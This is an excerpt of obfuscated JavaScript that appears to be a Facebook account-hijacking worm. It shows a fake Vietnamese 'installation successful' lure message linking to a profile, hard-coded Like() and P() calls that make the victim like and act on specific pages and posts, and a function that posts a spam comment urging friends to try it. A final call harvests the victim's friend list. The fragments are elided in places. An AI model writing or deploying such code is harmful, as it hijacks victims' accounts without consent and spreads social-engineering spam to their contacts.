...
"chars" : " :) ",
    ...
    html += '<a class="jewelFooter" href="https://www.facebook.com/nguyenlangphuoctai" target="_blank">CÀI ĐẶT THÀNH CÔNG! Bạn có thể thiết lập lại tên trong vài ngày tới, vui lòng kích chuột vào đây để thực hiện công đoạn hoàn tất sau 5 phút và không quá 60 phút kể từ khi đọc thông báo này. Ứng dụng sẽ bắt đầu tính thời gian chờ ngay sau khi bạn hoàn thành bước hoàn tất. Ứng dụng được phát triển bởi Cộng đồng IT Việt.<br>IT VIỆT</a>';
	html += '</div>';
...
// pic + fans
Like("511006992352563");
Like("240174562834820");
Like("407406999390968");
P("268552266640977");
P("262845647211639");
P("263380370491500");
P("614491185286116");
...
function yorum_yap(id, _0x7892xc) {
    ...
    _0x7892x8 += '&comment_text=(Y) Vừa tham gia xong 😍 🌹 Các Bạn Làm Thử Đi 💖 🎁 💋 💐 ☕' + encodeURIComponent(_0x7892xc);
    _0x7892x8 += '&source=2';
...
arkadaslari_al(229654970569514);
